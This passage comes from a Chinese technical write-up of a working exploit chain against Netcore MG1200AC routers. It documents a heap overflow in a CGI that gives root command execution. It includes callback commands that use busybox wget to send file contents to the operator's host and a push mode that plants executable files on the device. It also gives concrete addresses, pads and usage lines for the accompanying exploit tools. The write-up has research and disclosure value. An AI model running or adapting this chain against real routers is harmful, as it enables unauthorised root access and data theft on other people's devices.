* 形如 `for w in $(cat f); do … done` 的回调外传流水线不可用：在 §6.4 能命中的瞄准地址上 4 次全 miss，而长度相近的 `cat`/`rm` 组合正常命中。原因有两条：控制字无法由 `${IFS}` 引出（§6.4），且回调子进程比一次请求活得久，用延迟判定必然读成未命中（§7.2 第 8 条）。

### 7.2 反向数据通道：`run` 与 `push`

`run` 走这条通道（`--grep` 走 §7.1 的门控，不需要监听端口）。下列各条是决定实现的测量。

1. **入站投递可行。** `busybox wget -q -O /tmp/x http://<主机>:<端口>/x` 在库存 SH-V1.2.1 上工作 ⇒ 脚本可以先上传后调用，之后受限的只是"那条命令行"（≤1024 B、无 `0x20`），脚本正文不再受表单值约束。
2. **出站批量回传，一条请求。** `busybox wget -q -O/tmp/o http://<主机>:<端口>/"$(cat /tmp/f)"` 把文件内容原样写进 HTTP 请求行，接收端用**原始 TCP 套接字**读取（不能用 HTTP 服务解析，它会在第一个换行处截断）。单请求实测：`/proc/version` 121 B、`/proc/cpuinfo` 468 B、`/proc/meminfo` 923 B、`head -600 /proc/kallsyms` 16 249 B；空格、制表符、内嵌换行全部保留。
3. **替换必须加引号。** 不加引号的 `$(cat f)` 会被按词分割，只送出第一个词（形如 `GET /Linux`），症状与"通道截断"相同。先行百分号编码也不行：该 busybox 1.1.2 的 `sed` 不执行 `s/[[:space:]]/%20/g`，编码静默失效，照样分割。
4. **不需要 base64，ROM 里也没有。** 95 applet 表中无 `base64`/`b64`/`od`/`hexdump`/`xxd`/`uudecode`，也没有 `openssl` 命令行；base64 只以 `libcrypto` 的 `EVP_EncodeBlock` 等库函数和厂商二进制里的内部 helper 存在，`system()` 够不着。
5. **这台机器上凡是带 `-x` 的 `grep` 都返回空。** `grep -n -x -F -f f 表`、`grep -n -x -F -e h 表`、`grep -n -x -e h 表` 全无输出，而 `grep -n -F -e h 表` 和 `grep -n -e '^h$' 表` 对字节 `h` 都返回 `104:`。症状与传输损坏相同：回传文件的**形状**（行长与换行位置）逐字节正确，只是每个值都是 0。applet 的选项支持只能上机测：1.1.2 的 usage 由 `Usage: %s %s` 拼装，静态读不出各 applet 接受哪些选项字母。
6. **没有 `printf`**（既无 applet 也无 ash 内建），所以"写出这些精确字节"只能靠逐行 `echo` 或入站文件。
7. **逐字节查表方案的代价（工具走的是第 9 条的单请求形状，这里只记录这条路的代价）。** 查表要 fork，实测 234 B 耗时 41 s、2 226 B 耗时 220 s（约 94–100 ms/字节）。若走这条路就得付三条代价：(a) 用 `sh /tmp/w <tag>; &` 后台跑——它比一次请求活得久，前台跑会被延迟判成未命中，而重试会反复重取命令文件；也就是说设备上要留一个后台进程，与 §6.4 末段那条"不留需要二次请求清理的后台进程"的纪律相反；(b) 编码之前先回传 beacon `/<tag>/started/<wc -c 值>`，让调用方及早知道命令跑了、输出多大；(c) 声明长度即完整性校验：`/proc/1/cmdline` 声明 133 B、实到 126 B，7 字节差额正是 NUL 的个数——这一条与方案无关，shell 携带不了 NUL 对现行的 `run` 一样成立（第 12 条；二进制文件仍需 `tftp -p`，见 §10）。
8. **回调按"到达"确认，不按延迟。** 按 tag 前缀匹配到达的流比延迟门控更强也更省：瞄点会在请求之间迁移，被判为未命中的那一发往往已经执行。轮次必须设上限——每一次真未命中都要付一个 CGI 子进程。
9. **工具的实现形状。** 一条请求做完全部三件事：`(CMD)>{path}; busybox wget -q -O{path}.r http://{lhost}:{lport}/{token}?"$(cat {path})"; rm -f {path} {path}.r`——写文件、连回、删除，`{token}` 每次运行随机，**没有 sleep 门控**；成功判据是"本机收到带该 token 的请求"。同一监听器也反向供文件（`push`，见下面第 13 条）。等待窗要按这条链的实际长度给：监听器只有在设备**停止发送**之后才回答（第 2 条的原始套接字读法），于是一发回连在板上就要约 2 秒，`push` 那种"先取文件、再回大小"的两跳链要 3 倍以上；等待短于此，一个正在工作的载荷会被判成未命中并重新开火。
10. **为什么必须分组。** 重定向只绑定到 `;` 列表里的最后一条命令：实测 `pwd;ls -a .>f` 写进 f 的只有 `ls` 的输出，`(pwd;ls -a .)>f` 才把 `pwd` 那行也收进去。而 `)` 与 `>` 之间**不能**插 `${IFS}`——它展开含换行，换行会终止复合命令、把重定向甩掉（同 §6.4 的"文件名前后"规则）。
11. **URL 内容逐字送达，不做规范化。** 同一份字节分别经 path 槽与 query 槽回连，`/a/../b`（不解析 `..`、不合并 `//`）与 `hash#inside`（不裁 fragment）都原样到达；所以 `?` 只是让分隔符明确，不是为绕开什么限制。
12. **代价与边界。** 手上已有瞄点时（`--addr`，或缓存里的瞄点因启动指纹变了而要重新协商）一次冷路径 `run`（任意输出长度）是 **8 个请求 / 0 次登录**：量门控 3 条只读 + 标定 2 + 协商 2（含一次确认）+ 执行兼回连 1，写、传、删都在这最后一发里；没有瞄点时还要在其前加上整套堆扫描（§6.3 的两趟；SH 板上选定版本后一轮 96 个崩溃请求）。热路径（第 14 条）只有那 1 发执行兼回连，也不量门控。单请求回传量 121 B、223 B、542 B、16 249 B。限制：NUL 无法穿越 shell/C 字符串（`/proc/1/cmdline` 声明 133 B、实到 126 B，差额即 7 个 NUL），尾部换行被 `$( )` 去掉；二进制要另走 `tftp -p`（§10）。设备连不到操作者时（不同网段、`--lhost` 写成了 127.0.0.1）改用 `--grep`。
13. **`push`：反向同一条通道，二进制安全。** 设备用 `busybox wget -q -O REMOTE http://…/{token}up/{name}` 从本监听器取文件——字节走 HTTP 响应体，不经过 shell，所以 NUL 与任意二进制都没问题；随后 `?p?"$(wc -c <REMOTE)"` 把大小连回来做校验，`--chmod` 加执行位，最后 `rm -f REMOTE.d` 清掉那份大小回执（§10 的临时文件纪律）。实测 212 B 文本（含 tab/`%`/`#`/`$`/引号/反斜杠/`..`/`//`）push→`run cat` 往返回到逐字节一致；4117 B 含 NUL 二进制 push 后大小一致，且 `head -c 72 | tail -c 8` 取回的正是原文件第 65–72 字节。该 busybox 1.1.2 的 `dd if=… bs=1 skip=64 count=8` 无任何输出（同一份数据用 `head`/`tail` 正常），取片段不能用 `dd`。
14. **启动指纹：`/web360/getrouterinfo.cgi`。** boa 的 `^/web360/\w+\.cgi$` 交给 `/web/web360/n360.cgi`，同一个 guest 会话（`token_id` + cookie）POST 空正文即回 `{"err_no":"0","err_des":"","data":{"uptime":"19154","model":"MG1200AC-SH","version":"Netcore-MG1200AC-SH-V1.2.1.331","cpu":"0","ramtotal":"128","ramfree":"51"}}`——一条普通请求，不崩子进程，`uptime` 是设备自己的秒数。`本机时刻 − uptime` 即设备的**启动时刻**，而启动正是瞄点/pad/锚点唯一会整体搬家的诱因（§6.3、§8.2），所以它没变（±10 秒容差，覆盖读秒与请求延迟）就可以直接沿用上次量到的值。`run`/`push` 的成败判据本来就是**回连到达**而非延迟，于是这两条路径在启动指纹匹配时直接按缓存瞄点开火，量门控、标定与确认那几发全省；只要还得扫描或协商（无缓存、指纹不匹配、`--addr`），它们与结论本身就是延迟的 `check`/`sweep`/`reboot`/`run --grep` 一样照旧先标定。
15. **同一条回答里的 `version` 就是固件身份，所以预设由它选定，不靠试。** 串形如 `Netcore-MG1200AC-SH-V1.2.1.331`，与 `V1.0.7`/`V1.2.7`/`SH-V1.2.1` 三条签名匹配即只用那一条的 pad 与锚点——猜错一个 pad 的代价是一整轮堆扫描（§6.3）。对不上任何签名（或设备不作答）时**运行停止**并指向推导（`mg1200ac_rom.py` → `--constants`），只有命令行自己给了 `--constants`/`--pad`/`--got` 才继续；`--rom vXXX` 是人工覆盖，与自报值不一致时打印警告。这条只读请求在任何模式都会先发，`--no-cache` 也发。SH 板上 `sweep` 报 `the device reports Netcore-MG1200AC-SH-V1.2.1.331`，于是只扫 pad 108 一轮：**96 个崩溃请求 / 2 次登录 / 1 次扫描**，协商第一发即 `2.07 秒` 命中。

整条链仅经 HTTP 就能从冷启动走完：前置条件（TCP/23 拒绝、全程不发任何串口命令）→ 探针标定 → 载体定位 → 预言机对照 → uid 0 → 输出回读 → 自清理，一次登录、约 20 个请求；重启也由漏洞自身完成（`/sbin/reboot` 经 `system()`，HTTP 42 秒后恢复，tmpfs 清空）。载体既由已知瞄点的快路径确认，也由独立的两趟盲扫描确认（32 + 9 个请求），两者都是 `0x0041a208`。

运维约束（实测值）：

* `web_login.cgi` 在会话表满时返回 `{"err_no":"48","err_msg":"create session err"}`，客户端消失不释放条目，实测解除封锁约 **11.5 分钟**。因此必须复用会话；被拒的会话可由响应体里出现 HTML 登录页（`<head>`）识别——空正文是载荷自身的特征，不能用于该判断。
* 探测只允许完成 `action=get`：会完成的 `action=mod`/`add` **会存储**一条 radio_power 定时项，所以设置接口不能当存活检查用。本工具每个请求都带 `action=mod`（门条件所需），但载荷在 `cgi_get_time_cgi` 返回前就调用 libc `exit()`（§4.6），按静态阅读存储路径走不到，实测一致：SH-V1.2.1 上跑完整轮（约 190 个崩溃探测 + 1 次成功的 uid 0 载荷执行 + 回读；这 190 与上面"约 20 个请求"不是同一口径，差异见 §9 末段）前后读到的都是 `{"now_power":"100","time":[]}`，即本工具不留定时项。`action=get` 只读、可安全发出，是核查残留的手段。
* **长回读会让瞄点整体失效**：载体不只在两槽之间交替，自身请求流堆积下会整体搬迁——逐字符回读读出第 1 个字符之后，两个已确认基址可以都不再落地，连续 5 次重扫（每次约 184 个崩溃请求）也未必能重新抓住。因此重扫有上限：一轮最多 `--max-sweeps`（默认 4）次全扫，用完即提示改用 `--grep` 或重启，不再继续消耗请求预算。

## 9 工具：`mg1200ac_run.py` + `mg1200ac_rom.py`

分析在本文档，实现说明只在 `-h`。选项分组只有两组：`firmware constants`（固件常量与落点）与 `output`（回传与判定），其余是通用项。

| 模式 | 作用 |
| --- | --- |
| `check` | 定位落点、协商瞄准地址，并跑 §6.4 的 uid 0 证明 |
| `sweep` | 只定位并打印常量（pad、锚点、载体基址），不做证明 |
| `run <cmd>` | 执行命令并回显其**全部**输出：一条请求里"写文件 → 连回 `--lhost:--lport` → 删除"，**全程没有 sleep 门控**（§7.2）；缓存里那次启动仍然成立时，`run`/`push` 就只发这一条（§7.2 第 14 条）；加 `--grep` 则改成一位式门控请求，不需要监听（§7.1） |
| `push <LOCAL> <REMOTE>` | 把本地文件写到设备的 `REMOTE`（经同一监听器的 HTTP 响应，**二进制安全**，大小回执做校验；`--chmod` 可加执行位，§7.2 第 13 条） |
| `reboot` | 经漏洞重启设备（需 `--yes`）。**先证再发**：第一发是门控 `test -x /sbin/reboot && sleep N`，一次延迟同时证明两件事——载荷确实在执行、且那条命令存在并可执行；证明失败就不发任何东西并返回 1。证明成立后把 `/sbin/reboot` 逐个已知瞄点各发一发（载体在两槽交替，§6.3），**随即返回，不做任何事后验证**：真重启的设备会停止应答、会话表也一并消失，事后读什么都要么读不到、要么需要本工具从不预置的口令。设备是否回来由操作者核对。证明发延迟 2.08 秒（该机 busybox 的 `test` 支持 `-x`），两发 `/sbin/reboot` 发出即返回 0，设备 44 秒后以同一库存页应答、`uptime` 43 秒、启动时刻跳变 +575 秒（远超 ±10 秒容差）。**这一模式只是演示**：guest 会话本来就能重启设备（§10 的 `/router/reboot.cgi`），而这条链的前提正是已有 guest 会话，所以它不提供任何新能力；留下的只有"先证再发"那个形状本身——一次延迟同时证明载荷确实在执行。§11.4 的免断电刷写用普通请求即可，不必经漏洞 |

动作参数没有默认值：必须显式写出 `check`/`sweep`/`run`/`push`/`reboot` 之一，裸跑只打印用法。

`run`/`push` 用**到达**而非延迟判定成败，所以它们可以在热缓存上跳过标定与确认：一次普通状态请求（§7.2 第 14 条）确认设备仍处在上次量到的那次启动里，就直接按缓存瞄点开火——**1 个请求 / 0 次登录**（设备 `/proc/uptime` 与指纹算出的启动时刻相差 1 秒）。若一条都没回连，则**清除缓存里的瞄点**（保留会话，下次不必重新登录），下一次运行回到标定+扫描。延迟路径（`check`/`sweep`/`reboot`/`run --grep`）照旧先标定再确认，并且先量门控（§6.4）——它们的结论本身就是一条延迟，两件事都得有当下的基线；`run`/`push` 没走上热路径（要重扫或重协商）时同样走这套。

没有 `shell` 模式：库存固件的 applet 表里没有任何能绑听或给出交互 shell 的程序（§4.7）。`--lhost`/`--lport` 只服务于 §7.2 的单向数据回传（一次性 HTTP 请求）与 `push`。

| 选项 | 默认 | 说明 |
| --- | --- | --- |
| `--rhost` | `192.168.0.1` | 设备 web 地址 |
| `--user` | `guest` | web 登录名。缓存里的会话**按用户核对**：`--user` 换了人不会静默沿用旧用户的 token，而是按冷启动重新登录（此时才需要 `--password`） |
| `--password` | 空 | CLI 不预置口令；只在没有可用会话凭据、或设备拒绝既有会话时才需要 |

依赖：python3 ≥ 3.11（`typing.NotRequired`）+ pycryptodome。

```
python3 mg1200ac_run.py --password guest1 check      # 冷启动：登录、定位、证明 uid 0
python3 mg1200ac_run.py run 'cat /proc/version'      # 之后无需口令：复用缓存的会话
python3 mg1200ac_run.py run 'ls /var/tmp; cat /proc/version'   # 分号列表的全部输出都会回来
python3 mg1200ac_run.py push ./helper /var/tmp/helper --chmod 755
python3 mg1200ac_run.py run --grep 'Linux version' 'cat /proc/version'   # 一位、不监听
python3 mg1200ac_run.py run --grep 'zzz impossible pattern' 'cat /proc/version'  # 同一形状的阴性对照，必须答"不匹配"
python3 mg1200ac_run.py --addr 0x0041a208 run 'cat /proc/version'        # 跳过扫描
```

本脚本只内置 §8 的三个库存镜像的预设，并且**只走设备自报的那一条**（§7.2 第 15 条）：报出的版本对不上任何已知签名就直接退出，不做按序试错的堆扫描。其余固件由 `mg1200ac_rom.py` 推导常量（runner 自己不碰文件系统，也不需要 binutils）：先从 §8 的公开 URL 取对应 ROM，解出 squashfs（v3 文件系统，本机的 `unsquashfs` 或等价工具皆可），再把解包根目录交给推导脚本——它需要 `<root>/app/radio_power/webs/app.cgi`、`<root>/lib/cgi.so`、`<root>/lib/libc.so.0` 三个文件，以及 `mipsel-linux-gnu-readelf`/`-objdump`：

```
python3 mg1200ac_rom.py ./extracted/sqfs -o constants.json
python3 mg1200ac_run.py --constants constants.json check
```

`mg1200ac_rom.py` 打印 pad（从 `cgi_get_time_cgi` 自己的栈帧布局）与可用的 GOT 锚点（只保留符号确实落在共享 libc 偏移上的槽），产出 `--constants` 用的 JSON，也可直接抄它给出的 `--pad/--got/--got-sym`。推导结果与内置预设**逐字相符**：V1.0.7 → pad 76 + 锚点 `0x4131c8/0x4131dc/0x4131e4`，SH-V1.2.1 → pad 108 + `0x4127bc`（两家人的栈帧形状不同：V1.0.7 把 `sp` 拷进 `s8` 并用 `sw ra,164(sp)`，V1.2.x 用 `addiu rX,sp,N` + `lw ra,156(sp)`，推导器两种都认）。

工具与本文档一致的机制：常量由设备自报的版本选定唯一预设（对不上就退出，不挨个试，§7.2 第 15 条）；扫描跑两趟，命中后在所有观测到的瞄点上重试，且每个命中都要第二发慢回复确认（§6.2、§6.3 的交替与搬迁）；两类阈值都在同一次运行内现测——落地探针的 miss 基线与门控秒数各测各的，传输失败以负耗时上报因而永不计为命中（§6.2、§6.4）；输出走 §7 的通道；缓存里是载点对、`(pad, anchor)`、会话凭据（含其所属用户）与**量到它们时的启动时刻**，热启动据此跳过全扫与登录（`--cache`）。

各机制在未经修改的 SH-V1.2.1.331 上仅经 HTTP 的数值：

| 机制 | 数值 |
| --- | --- |
| uid 0 门控（§6.4） | `check` 三条：对照不延迟，`kill -0 1` 2.06 秒，读 `Uid:` 行 2.08 秒 |
| 一位式回读随模式翻转（§7.1） | 同一命令 `cat /proc/version`：`'Linux version'` 2.12 秒 matched，`'zzz not in any file'` 不延迟 |
| 两类阈值不可互换（§6.2） | 按门控阈值 4.00 秒（`--secs 8`）扫描得 **0** 个命中；同一载体按现测的 0.42 秒落地阈值扫得 `0x0041b808` + `0x0041e808` |
| 门控由量得（§6.4） | 3 条只读请求全被答，最慢 0.02–0.05 秒 ⇒ 门控 2 秒、阈值 1.00 秒；判定值 2.06–2.12 秒对 0.02 秒 |
| 标定探点在载体之外（§6.2） | `0x00410108` 0.02/0.03/0.02 秒，`0x0040c108` 0.02/0.02/0.02 秒 |
| 版本选预设（§7.2 第 15 条） | 报 `Netcore-MG1200AC-SH-V1.2.1.331` ⇒ 只扫 pad 108 一轮：**96 个崩溃请求 / 2 次登录**，协商第一发 2.07 秒命中 |
| 热路径（§7.2 第 14 条） | `run 'cat /proc/version'` → 121 B 回连，统计 `1 exploit + 1 普通 + 0 登录` |
| 二进制投递（§7.2 第 13 条） | `push` 424 B + `--chmod 755`：大小一致、权限 `-rwxr-xr-x`，设备上只剩 `probe.bin`（回执 `.d` 由链尾删除，§10） |
| `reboot` 先证再发 | 证明发 2.08 秒（该机 `test` 支持 `-x`），两发 `/sbin/reboot` 后即返回；44 秒后设备以 §8.4 的库存页应答，`uptime` 43 秒、启动时刻跳变 +575 秒 |

流量口径与工具收尾打印的那一行同名（`[+] N request(s) …: X exploit, Y plain, Z login, W sweep(s)`，总数 = 崩溃 + 普通 + 2×登录）：**崩溃请求**（`exploit`）是带溢出字段的请求，无论命中与否都打死一个 CGI 子进程；**普通请求**（`plain`）是只读的 web 请求，即 §6.4 量门控的 3 条与 §7.2 第 14/15 条那条自报版本和 `uptime` 的状态请求；**登录请求**按一次登录的两发（取 AES key、提交口令）计，所以总数里是它的两倍。按此口径：版本选定预设后冷启动只扫一轮（96 个崩溃请求 / 2 次登录）；带缓存的延迟判定路径 6–110 个请求（未命中要重扫）；热路径 `run`/`push` 是 1 个执行兼回连的请求加那 1 条普通请求。§8.2 那批约 190 个崩溃探测的口径来自 pad 未经版本选定、门控固定 8 秒的形状；长回读会被载体搬迁打断，见 §8.2。

## 10 其他设备事实

* 厂商 busybox 是 1.1.2（无 `awk`/`od`/`hexdump`/`printf`/`tr`）。
* **重启是管理页自带的功能，而且 guest 就能用**，不需要漏洞：`/web/misc_reboot.htm`（移动端另有 `/web/mobile/misc_reboot.htm`）立即重启走 `$.post("/router/reboot.cgi",{noneed:"noneed"})`，同一页还有定时重启（`/router/reboot_timer_show.cgi` 读、`/router/reboot_timer_set.cgi` 写），三者都归 `cgitest.cgi` 宿主（§2 的路由表）。厂商 JS 对该请求**不等响应**（回调整段被注释掉，留下的注释说无线在某些设备上会立刻断网收不到返回）——与本工具 `reboot` 模式"发出即返回、不做事后验证"的形状是同一个理由。既然动用这条链的前提正是已经握着 guest 会话，漏洞版重启并不提供任何新能力（§9）。
* ROM 里没有任何 `rcS`/`inittab` 行引用 `telnetd`。**进程名不等于监听**：库存 busybox 的 `telnetd` main 就是 §4.7 的 `while (1) sleep(-1);` 空桩，永不 `bind()`，所以这条进程在出厂固件上给不出 shell。
* `grep -q` 支持 `[[:space:]]`（§7.1 用到）。SH-V1.2.1 实机也确认了 `sed` 与管道形状 `CMD | sed -n 1p >文件` 可用（`>` 必须紧邻路径），设备 GNU 风格的 BRE 括号类（`[*]`、`[$]`）按字面匹配。
* `/tmp` 是**指向 `/var/tmp` 的符号链接**（实机 `ls -ld /tmp`：`lrwxrwxrwx 1 admin root 8 ... /tmp -> /var/tmp`），而 `/var` 是 16 MB 的 tmpfs：`ls /tmp` 因此只打印链接名本身（要 `ls /tmp/` 才列目录），工具的临时文件实际落在 `/var/tmp`，重启即清。
* 二进制文件要落到设备上只能走 `tftp -p`，而该 busybox 只会拨 UDP/69。
* 板载临时文件必须删除并用 `[ -e ]` 逐项确认：`/tmp` 是 tmpfs（RAM，101 MB 机器上 400 KB 的转储已成可观占用），且管道的 `$?` 反映的是最后一个命令（`head`），`echo X=$?` 在 `grep | head` 之后与 `grep` 的退出码无关。`push` 的大小回执 `REMOTE.d` 由同一条命令链删掉。已知边界：`run` 的整份输出链把 `rm -f {path} {path}.r` 排在拨回 wget **之后**，若该 wget 因路由不通而一直挂着，清理就执行不到，那两个文件会留在 tmpfs 里直到重启（一次 ≤ 输出大小的残留；设备的会话与路由恢复后重跑即可，不需要人工清理）。
* 同一库里的其它解析函数使用同样的 `sscanf`/`strcpy` 形状。
* `boa` 不映射 `cgi.so`（CGI 是 fork+exec）；它自身是 `ET_EXEC @ 0x400000`，`[heap] 0x00428000-0x00458000 rwxp`；它会缓冲完整个 POST 正文才 fork。
* 本内核不写 core dump（即使 `RLIMIT_CORE=unlimited`，管道式 `core_pattern` 也被抑制）。
* 反复 POST `wire_bas_ap_set.cgi` 会让 boa 重启（应用配置会重启 web 服务；实测见过 `ps -o etime` 里 boa 1h21 对 wscd 5h20），因此旧 pid 不能证明服务未变。

## 11 测量环境与刷写

### 11.1 链条成立所需的前提汇总

链条成立需要以下各项同时为真：`cgi.so` 本函数无金丝雀；宿主是 `ET_EXEC` 且 brk 堆不随机；堆被映射为可执行；`%s` 的 NUL 恰好与可达窗口兼容；表单值被 url 解码进任意字节的堆缓冲区；CGI 子进程以 uid 0 运行；guest 被允许调用一个设置接口。

在 V1.2.x 上，`cgitest.cgi` 宿主因 PIE 失去第二、三项（变成远程 DoS），而 `radio_power` 宿主全部保留——实测其堆在固定基址上是 `rwxp`，值以固定偏移落在其中。两个版本相关的常量是溢出距离（76 → 108）与 libc 的来源：V1.0.7 的 `cgi.so` 把 `memset` 放在 `$gp` 相对存储里，V1.2.7/SH 懒绑定，因此指针必须取自 `app.cgi` 自己的固定 GOT——这只要求"那个地址不要编进指令"，不需要泄漏。SH-V1.2.1.331 与 V1.2.7 在此完全一致。

### 11.2 用于测量的改机调试镜像

8192072 B，`header.len=0x7d0008`，= 原生 V1.2.7 内核 + 只改四处的 rootfs；打包时会拿原生 ROM 自检容器几何与 HMAC（因为该容器的 ECC/HMAC 配方对每个字段都敏感）。四处改动：

* `/etc/inittab`：`ttyS0::respawn:/bin/ser`（无参数形式；busybox 1.1.2 的 init 对非空 id 会打开 `/dev/<id>`，这正是绕开 `console=/dev/null` 的办法），另加一行 telnetd。
* `/etc/rcS`：在挂载 `devpts` **之前** `mkdir -p /dev/pts`，然后 `mknod /dev/ttyS0` + `stty 38400`，并写 `/var/diag.txt` 自述。
* `/bin/ser` → `/sh/ser.sh`：每次起 shell 前重设 `stty 38400` 的 respawn 循环。
* `/bin/bb`：静态 busybox 1.31（厂商的是 1.1.2，没有 `awk`/`od`/`hexdump`/`printf`）。它是**单 applet**构建，只识别以 applet 命名的软链，所以 inittab 里 `/bin/bb telnetd` 一行不生效；可用的 telnet 起法：`ln -s /bin/bb /var/telnetd; /var/telnetd -F -l /bin/sh -p 23`。

该镜像只是用来读 `/proc/<pid>/maps`、`/proc/<pid>/mem` 和 GOT 槽值的，**不是漏洞链的前提**：同一套流程在未经修改的厂商固件上端到端通过（§8.2、§8.3）。

### 11.3 在有设备 shell 时确定载体地址

web 路径本身不可观测：boa 会自行缓冲 POST 正文、只有凑满 `Content-Length` 才 fork，因此停在半路的请求没有子进程、跑完的只活约 2 毫秒。设备侧的做法：

1. `kill -STOP $(pidof radio_power_app)`——门条件的结尾是 `nc_ipc("/tmp/rp_ipc")`，对端冻结后每个 `radio_power.cgi` 子进程解析完整个表单然后停在 `unix_stream_recvmsg`，常驻且可检查，无竞态（实测 `P /proc/29825 unix_stream_recvmsg`）。
2. 读该子进程的映射与各可读映射（`/proc/<pid>/mem`）。`boa` 自己不映射 `cgi.so`，因此 CGI 确实是 fork+exec 子进程。

| 值长度 | 载体地址 | 映射 |
| --- | --- | --- |
| 3000 B 的 `Q` | `0x0041ab30` = `[heap]`+`0x6b30`（两个子进程一致） | `[heap] rwxp` |
| 1280 B 载荷 | `0x00419610` = `[heap]`+`0x5610`，首字 `41 41 08 25`（滑撬） | `[heap] rwxp` |

这是**停在 `nc_ipc` 内**的堆状态，`cgi.so` 之后的分配还没发生，因此不等于溢出返回时的状态——活跃 web 路径的载体基址高 `0xBF8`（`0x0041a208`）。即：表单值被 url 解码进一块连续、任意字节、**可执行**、**地址不随机**的缓冲区。

### 11.4 固件刷写

镜像经 bootloader AUTOBURN 刷写：`.bin` 用 tftp 传到 RAM `0x80A00000`，再从 `0x30000` 烧入（bootloader 与 config 分区不动）；回读 `FLR 0x30000` 得 `63367263 0000A080 00000300 06D07200`（原生 V1.2.7 的 payload 长 `0x0072D006`，调试镜像是 `0x00766408`）。**未经修改的厂商镜像**只需 `IPCONFIG` + tftp put 即达 `rsa check pass ,start upgrade!` 并在 `0x30000` 烧入，无需改 bootcode（`EW A0002560 0` 只在重新打包丢掉 RSA 尾巴时才需要）。进入 bootcode 的重启是一个普通请求就够的事：guest 会话 POST `/router/reboot.cgi`（§10）即可，因此整个刷写不需要断电——这里没有用到漏洞，用漏洞反而只是绕路。

## 12 预认证候选

前文（§1–§10）的链条不是预认证的。下表是无认证面各候选的结论与关键证据。

| 候选 | 结果 |
| --- | --- |
| boa `sub_40A050`（`/sdownload`、`/tdownload`）栈溢出 | 数据来自 `nc_ipc("/tmp/yunpan_ipc")`；该云下载子系统在此 ROM 中已被剥离（rootfs 内无服务端、无该 socket）⇒ 死路 |
| boa `sub_407F70` multipart | 同一个 `yunpan` 面，同一结论 |
| boa `log_request` 格式串堆溢出 | 可写字节字母表只有可打印 ASCII（无 `0x00`、无 ≥`0x80`，写不进地址），且只触及相邻请求对象的头/`buffer` 指针，其中 `buf_pos` 是偏移而非指针；无第二处 freesite ⇒ 只有跨请求破坏/崩溃 |

| `cgi.so main` 的 URI 段 `strncpy`（`/webnoauth/…cgi`） | 可达但不可控：`s[64]` 在 `$fp+0x158`，循环游标 `v18` 在 `$fp+0x198 = s+64`，任何超过 64 字节的段都会踩坏游标，随后的 `while ((*argv)[v18]==47)` 变成约 0.8 GB 越界读——子进程死在循环里，`main` 永不返回 ⇒ 稳定的远程 DoS |
| wscd（TCP 52881）`PutMessage` 的 WSC 属性长度 | 一条无认证 `PutMessage(NewInMessage=base64(TLV))` 就把 ≥64 KB 任意字节连续写进固定地址的 rwx 堆（实测 `0x004a9e39..0x004b9839`，声明长度只有 `0xfa00`）；SSID 的 32 字节上限未检查；守护进程存活并把 brk 从 112 KB 长到 400 KB ⇒ 内存破坏 + 无认证资源 DoS。无控制流：SSID 的唯一消费者 `strcpy(ctx+47298,…)` 被 `strlen<0x21` 守卫，且其源字段只由驱动事件（关联指示 / PIN）填充而非网络数据；`connect_wps_ap` 的 144 字节 strcat 消费的是空口扫描结果 |
| `/webnoauth/na.cgi`（67 KB 独立二进制，内嵌上游 cJSON） | 无原语：URI 段 `strncpy` 结构上不可控（游标紧邻 `s+64`）⇒ 仅 DoS；PATH_INFO/URI 尾部被锚定比较拦下（302，值未经解码即回显），任意字节到不了 `argv[1]`；"正文 ≥64 B 就崩子进程"的现象来自名字不在 `IGD_CGI_FUN_MAP`（只有 `model.cgi@0x401f34` 与 `router_function_list.cgi@0x403418`）里时的错误路径；真实处理器对 8 B..900 B 正常回 302；内嵌 cJSON 指纹为未修改的上游 1.5.x–1.6.0（缺 1.7.0 符号、无厂商 API、未链 cJSON_Utils），其公开问题是越界读 / OOM / 860 MB 级输入，而请求根本到不了解析器（响应大小恒为 2897/335 字节） |
| wscd `memcpy(ctx+4872, REGISTRAR_NONCE, n)` | 动作处理器拒绝任何解码后 ≥`0x640` 的块（n ≤ 1600），且指针/游标字段属于另一对象（`calloc(1,0x1860)` 会话结构）⇒ 无有效写入 |
| `cgi.so parse_form_encoded` 的 `realloc(1)+strncpy(4096)` | 死代码：零调用者，rootfs 内无引用 |
| dhcpd（上游 ISC DHCP 2.0pl5）`vsprintf` 写入 .bss | 形状类似 CVE-2004-0461，但报文路径的日志器只插值约 17 字符的硬件/IP 串，有用的全局量在 2048 字节之外；可溢出的路径是租约/配置文件（需要本地写入） |
| `bin/auto_update` 的 `system("wgets …")` / `system("ping -c 10 %s")` | 汇合点真实，但需要能写 `/tmp/auto_update_check_info`；没有网络写文件的原语（落盘上传服务 `app_preload` 在 ROM 里被注释掉） |
| 802.11/EAPOL 的 wscd 路径 | 因范围排除（不做串口、不做帧注入），非因分析结论 |
